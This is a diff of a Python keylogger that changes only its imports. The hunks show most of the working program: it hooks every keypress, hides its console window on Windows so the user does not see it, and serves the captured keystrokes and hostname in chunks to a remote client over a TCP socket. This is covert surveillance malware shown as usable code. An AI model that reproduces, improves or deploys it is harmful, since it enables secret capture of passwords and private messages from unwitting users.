@@ -4,14 +4,14 @@
     Get all the keys pressed by user and send them to the client
 """
 
-import os
-import sys
-import time
+from os import environ
+from sys import exit, platform
+from time import sleep
 import socket
-import json
+from json import dumps
 
-import keyboard
-import win32gui
+from keyboard import unhook, on_press, add_hotkey
+from win32gui import ShowWindow, GetForegroundWindow
 
 
 SENDING_KEYS_INTERVAL = 0.3 # seconds
@@ -49,7 +49,7 @@ def send_keys(conn, addr):
 
     if not keys_buffer: return # if the user has not pressed any keys
 
-    data = json.dumps({"hostname" : hostname, "keys" : keys_buffer})
+    data = dumps({"hostname" : hostname, "keys" : keys_buffer})
     
     if len(data) < 1024: # if the data takes less than 1024 bytes, send it to the client in one shot
         try:
@@ -63,17 +63,17 @@ def send_keys(conn, addr):
     else:
         # send chunks of 20 keys
         for i in range(len(keys_buffer)//CHUNK_SIZE):
-            data = json.dumps({"hostname" : hostname, "keys" : keys_buffer[i*CHUNK_SIZE:(i+1)*CHUNK_SIZE]})
+            data = dumps({"hostname" : hostname, "keys" : keys_buffer[i*CHUNK_SIZE:(i+1)*CHUNK_SIZE]})
             try:
                 conn.sendall(data.encode("utf-8"))
             except socket.error as e:
                 print(f"Error sending keys (len(data) > 1024) {e}")
                 isHostConnected = False
                 return
-            time.sleep(0.1)
+            sleep(0.1)
         # send the rest of the buffer to the client
         try:    
-            conn.sendall(json.dumps({"hostname" : hostname, "keys" : keys_buffer[(i+1)*CHUNK_SIZE:]}).encode("utf-8"))
+            conn.sendall(dumps({"hostname" : hostname, "keys" : keys_buffer[(i+1)*CHUNK_SIZE:]}).encode("utf-8"))
         except socket.error as e:
             print(f"Error sending keys (len(data) < 1024) (last chunk) {e}")
             isHostConnected = False
@@ -92,13 +92,13 @@ def stop(hook_id):
     global isRunning
 
     isRunning = False
-    keyboard.unhook(hook_id)
+    unhook(hook_id)
 
 
 def hide_windows_console():
     """Hide the console of the programm (works only for Windows)."""
-    if "TERM_PROGRAM" in os.environ.keys() and os.environ["TERM_PROGRAM"] == "vscode": return # to not close vs code window (https://stackoverflow.com/questions/71877225/detect-python-is-running-in-visual-studio-code)
-    win32gui.ShowWindow(win32gui.GetForegroundWindow(), 0) 
+    if "TERM_PROGRAM" in environ.keys() and environ["TERM_PROGRAM"] == "vscode": return # to not close vs code window (https://stackoverflow.com/questions/71877225/detect-python-is-running-in-visual-studio-code)
+    ShowWindow(GetForegroundWindow(), 0) 
 
 
 def main():
@@ -107,8 +107,8 @@ def main():
     """
     global keys_buffer, isRunning, isHostConnected
 
-    hook_id = keyboard.on_press(on_key_press)
-    keyboard.add_hotkey(STOP_HOTKEY, stop, args=[hook_id], suppress=True) # stop the server when ctrl+maj+q is pressed (dont work if it is not already connected)
+    hook_id = on_press(on_key_press)
+    add_hotkey(STOP_HOTKEY, stop, args=[hook_id], suppress=True) # stop the server when ctrl+maj+q is pressed (dont work if it is not already connected)
 
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
 
@@ -117,7 +117,7 @@ def main():
         except OSError as e: # the port is already in use
             print(f"Error binding to {SERVER_HOST}:{SERVER_PORT} : {e}")
             input("Press enter to exit...")
-            sys.exit()
+            exit()
 
         s.listen()
         # set timeout to 5s so if isRunning is False it wont block to wait for a connection
@@ -135,7 +135,7 @@ def main():
             s.settimeout(None)
 
             while isHostConnected and isRunning:
-                time.sleep(SENDING_KEYS_INTERVAL)
+                sleep(SENDING_KEYS_INTERVAL)
                 send_keys(conn, addr)
 
 
@@ -146,5 +146,5 @@ if __name__ == "__main__":
     isHostConnected = False
     hostname = HOST_PSEUDO or socket.gethostname()
 
-    hide_windows_console() if sys.platform == "win32" else None # hide
+    hide_windows_console() if platform == "win32" else None # hide
     main()
